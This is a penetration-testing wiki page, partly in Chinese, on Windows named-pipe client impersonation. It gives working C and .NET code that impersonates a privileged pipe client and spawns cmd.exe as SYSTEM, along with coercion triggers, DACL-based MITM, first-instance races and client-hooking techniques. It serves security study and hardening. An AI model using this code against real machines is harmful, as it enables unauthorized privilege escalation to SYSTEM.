# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation 是一种 local privilege escalation 原语，它允许 named-pipe server 线程采用连接到它的 client 的 security context。实际上，能以 SeImpersonatePrivilege 运行 code 的攻击者，可以诱使一个特权 client（例如 SYSTEM service）连接到攻击者控制的 pipe，调用 ImpersonateNamedPipeClient，将得到的 token 复制成 primary token，然后以该 client 的身份启动一个 process（通常是 NT AUTHORITY\SYSTEM）。

本页聚焦于核心 technique。关于能诱使 SYSTEM 连接到你的 pipe 的端到端 exploit chain，请参见下面引用的 Potato 系列页面。

## TL;DR
- Create a named pipe: \\.\pipe\<random> and wait for a connection.
- 让一个特权组件连接到它（spooler/DCOM/EFSRPC/etc.）。
- 从 pipe 读取至少一条 message，然后调用 ImpersonateNamedPipeClient。
- 从当前 thread 打开 impersonation token，DuplicateTokenEx(TokenPrimary)，并使用 CreateProcessWithTokenW/CreateProcessAsUser 获取一个 SYSTEM process。

## Requirements and key APIs
- 通常调用 process/thread 需要的 privileges：
- SeImpersonatePrivilege，用于成功 impersonate 一个连接的 client，并使用 CreateProcessWithTokenW。
- 或者，在 impersonate SYSTEM 之后，你可以使用 CreateProcessAsUser，这可能需要 SeAssignPrimaryTokenPrivilege 和 SeIncreaseQuotaPrivilege（当你正在 impersonating SYSTEM 时，这些会得到满足）。
- 使用的核心 APIs：
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile（在 impersonation 之前必须至少读取一条 message）
- ImpersonateNamedPipeClient 和 RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW 或 CreateProcessAsUser
- Impersonation level：为了在本地执行有用的操作，client 必须允许 SecurityImpersonation（许多本地 RPC/named-pipe client 的默认设置）。client 可以在打开 pipe 时使用 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION 来降低它。

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary token suitable for process creation.

## .NET quick example
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
这些技术会强制特权服务连接到你的 named pipe，从而让你可以 impersonate 它们：
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

当特权服务和低权限进程通过 `\\.\pipe\...` 通信时，把这个 pipe 当作任何不受信任的 IPC 边界。除了经典的 server-side impersonation，弱 pipe ACL、危险的创建标志，以及 client-side trust decisions 都可能成为本地提权原语。

### Enumerate candidate pipes first
- 快速从 PowerShell 列出 pipes：`Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` 可用于发现 instance 数量和 single-instance pipes。
- 优先关注以 `SYSTEM` 运行的服务使用的名称，尤其是 helpers、updaters、launchers 和 UI brokers。

### MITM via permissive DACLs and extra pipe instances
- 任何能与特权 server 通信的进程，本来就可以 fuzz 其协议并寻找特权 verb。
- 更有意思的情况是 DACL 在 pipe object 上授予了 `FILE_GENERIC_WRITE`/`GENERIC_WRITE`。在 named pipes 上，这会隐式包含 `FILE_CREATE_PIPE_INSTANCE`（`FILE_APPEND_DATA` 共享同一位），因此攻击者可以创建同名的另一个 server instance。
- 由于 instance 按 FIFO 顺序匹配，攻击者创建的 instance 和合法 instance 可以交错：先用 `CreateNamedPipe` 创建一个 rogue instance，再用 `CreateFile` 打开同一个 pipe 名称，然后等待真实 client 落到 rogue server instance 上。
- 结果：可以观察、修改、relay，或 desynchronize 特权 IPC，而无需控制原始 server process。

### First-instance race on pipe security descriptors
- `lpSecurityAttributes` 只在某个 pipe 名称的第一个 instance 被创建时定义 DACL。
- 如果特权服务启动较晚且没有使用 `FILE_FLAG_FIRST_PIPE_INSTANCE`，攻击者就可以先用一个 permissive DACL 预创建该 pipe 名称，然后让服务在攻击者选择的 security context 下创建后续 instance。
- 这会把 service startup 变成一个 race condition：抢到 first instance，然后再通过被削弱的 ACL 连接或 MITM 后续 client。
- 对防御者来说这是一个加固点，对攻击者来说也是关键检查点：查看 `CreateNamedPipe(..., dwOpenMode, ...)` 是否包含 `FILE_FLAG_FIRST_PIPE_INSTANCE`。如果没有，在服务启动前测试 pre-creation。

### PID/signature checks are hardening, not a boundary
- 一些产品试图通过检查 `GetNamedPipeClientProcessId`、process image path，或连接 client 的 Authenticode signer 来限制访问。
- 这只能在你注入到合法 client 之前起作用：一旦进入受信任 process，你就继承了 server 期望的精确 PID/image/signature context。
- 对于 split desktop apps，instrument 低权限的 UI/helper process 往往比直接攻击 `SYSTEM` service 更容易。

### Hook the client according to its I/O model
- Synchronous I/O: 在 syscall 消费 buffer 之前拦截 `NtWriteFile`，并在 `NtReadFile` 返回后检查/patch。
- Overlapped I/O: 保存在 `NtReadFile` 中看到的 `OVERLAPPED`/`IoStatusBlock`，然后在 `GetOverlappedResult` 返回后或相关 wait 完成后检查 buffer。
- Completion ports: `GetQueuedCompletionStatus` 会到达 `NtRemoveIoCompletion`；返回的 `ApcContext` 会链接回原始 read 使用的 `OVERLAPPED`，这是找到现在已填充 buffer 的正确 pivot。
- Completion routines (`ReadFileEx`): completion callback 以 APC 方式投递。如果你想篡改返回数据或注入 synthetic replies，hook 真实的 completion routine，并且对于自定义注入，使用一个参数的 `QueueUserAPC` dispatcher 来重建该 routine 期望的 3 个参数。

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) 通过注入的 helper DLL 代理 named-pipe 流量，并提供类似 Burp 的编辑/replay 工作流。
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) 采用基于 Frida 的方法，重点 hook `NtReadFile`/`NtWriteFile` 以及上面的 async/completion pivot，然后把流量转发到基于 WebSocket 的编辑工作流。
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operational considerations
- Named pipes are low-latency; long pauses while editing buffers can deadlock brittle services.
- Overlapped/completion-port/APC-driven clients need different hooks than simple `ReadFile`/`WriteFile` detours.
- Injection into the trusted client is noisy and generally best kept for exploit development, protocol reversing, or local lab fuzzing.

## Troubleshooting and gotchas
- You must read at least one message from the pipe before calling ImpersonateNamedPipeClient; otherwise you’ll get ERROR_CANNOT_IMPERSONATE (1368).
- If the client connects with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, the server cannot fully impersonate; check the token’s impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requires SeImpersonatePrivilege on the caller. If that fails with ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser after you already impersonated SYSTEM.
- Ensure your pipe’s security descriptor allows the target service to connect if you harden it; by default, pipes under \\.\pipe are accessible according to the server’s DACL.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
